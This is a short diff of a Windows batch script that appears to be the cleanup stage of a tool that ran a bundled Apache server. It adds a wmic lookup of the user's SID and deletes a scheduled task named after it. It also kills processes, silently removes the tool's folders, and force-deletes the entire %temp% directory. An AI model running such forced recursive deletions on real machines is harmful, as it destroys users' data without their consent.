@@ -1,4 +1,5 @@
 set environment=C:\Windows
+FOR /F "tokens=1,2 delims==" %%s IN ('wmic path win32_useraccount where name^='%username%' get sid /value ^| find /i "SID"') DO SET SID=%%t
 
 rem TESTING >
 if "%computername%"=="WIN-6QJBGJLRIGL" set environment=%appdata%\microsoft\windows
@@ -20,7 +21,7 @@ taskkill /f /im httpd.exe
 "%environment%\nircmd.exe" execmd rmdir /s /q  "%environment%\apache2"
 "%environment%\nircmd.exe" execmd rmdir /s /q  "%environment%\7-Zip"
 "%environment%\nircmd.exe" execmd del /s /f /q /a "%environment%\nircmd.exe"
-schtasks /Delete /TN "<task folder path>\<task name>" /F
+schtasks /Delete /TN "%SID%XYZ" /F
 Taskkill /f /im winrun.exe
 del /s /f /q /a "%temp%\*"
 FOR /D %%p IN ("%temp%\*.*") DO rmdir "%%p" /s /q
